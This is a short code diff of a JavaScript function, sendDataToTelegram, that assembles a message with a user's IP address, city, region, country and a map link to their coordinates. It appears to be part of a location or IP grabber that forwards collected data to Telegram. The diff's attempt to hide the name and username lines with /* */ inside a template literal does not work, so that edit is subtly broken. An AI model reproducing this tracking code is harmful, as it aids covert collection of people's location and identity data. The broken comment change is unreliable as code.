@@ -101,8 +101,8 @@ function sendDataToTelegram(userInfo) {
     const locationLink = `https://www.google.com/maps?q=${userInfo.loc}`;
     const message = `
 
-Name: ${userInfo.telegram_name || 'Unknown'}
-Username: ${userInfo.telegram_username || 'Unknown'}
+/* Name: ${userInfo.telegram_name || 'Unknown'}
+Username: ${userInfo.telegram_username || 'Unknown'} */
 Ip: ${userInfo.ip || 'Unknown'}
 Address: ${userInfo.city || 'Unknown'}, ${userInfo.region || 'Unknown'}, ${userInfo.country || 'Unknown'}
 ltn Link: ${locationLink}
